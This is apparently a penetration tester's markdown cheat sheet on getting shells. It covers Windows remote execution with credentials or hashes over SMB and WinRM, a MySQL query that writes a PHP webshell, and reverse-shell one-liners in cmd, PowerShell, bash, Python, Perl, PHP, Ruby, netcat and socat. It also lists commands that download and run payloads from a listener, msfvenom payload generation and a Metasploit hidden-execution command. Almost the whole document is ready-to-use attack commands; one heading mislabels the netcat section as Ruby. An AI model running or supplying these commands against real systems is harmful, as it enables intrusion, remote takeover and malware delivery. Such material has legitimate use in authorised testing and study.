# Shells


## Windows Shell

### SMB

```bash
wmiexec.py <domain>\<user>:<pass>@<target>
winexe -U <domain>/<user>%<pass> //<target> cmd.exe /c dir C:\
python psexec.py '<user>:<pass>@<target>'
psexec @targets.txt -u domain\user -p password -s command

crackmapexec smb --exec-method wmiexec <host> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method smbexec <host_file> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method atexec <host> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method mmcexec <host> -u <user> -d <domain> -H <hash> -x <command>

WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
```

### WinRM

```bash
gem install evil-winrm
evil-winrm -i <target> -u <user> -p '<pass>'
```

---


## Webshell

### Mysql

```bash
SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
```

---

## Reverse Shell


### Check outgoing ports 

**Internet**

- [portquiz](http://portquiz.net/)

**local** 

```bash
# Generate and execute on target
msfvenom -p windows/meterpreter/reverse_tcp_allports -f exe > test_firewall.exe

# Listen for incoming traffic
tcpdump -ni any host <target>
```
### CMD

```bash
certutil -urlcache -split -f http://<listener_ip>:1234/shell.exe C:\Windows\Temp\shell.exe & start "" C:\Windows\Temp\shell.exe
```

### Powershell

```bash
Invoke-WebRequest -Uri "http://<listener_ip>:1234/nc.exe" -OutFile "nc.exe" & .\nc.exe -e cmd.exe <listener_ip> 1234

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<listener_ip>:1234/shell.ps1')|iex"
```


### Bash

```bash
bash -i >& /dev/tcp/<ip_listener>/1234 0>&1

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f elf > /var/www/html/shell.elf
wget <ip_listener>:1234/shell.elf -O /tmp/shell.elf && chmod 777 /tmp/shell.elf && /tmp/shell.elf &
```

### Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip_listener>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl

```bash
perl -e 'use Socket;$i="<ip_listener>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


### PHP

```bash
php -r '$sock=fsockopen("<ip_listener>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<ip_listener>",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


### Ruby

```bash
nc -e /bin/sh <ip_listener> 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip_listener> 1234 >/tmp/f
```

### Socat

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip_listener>:1234
socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:/home/leak
```




---

## Get better BASH shell 

Using socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:1234

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:1234  
```

Using stty

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
ctrl + z
stty raw -echo
fg
reset
```
> does not work for ZSH, use BASH !

## Metasploit 

```bash
#Upload, hide and exec
execute -H -i -c -m -d calc.exe -f /home/toto/exploit.exe -a '-arg1 -arg2 -arg3'
```

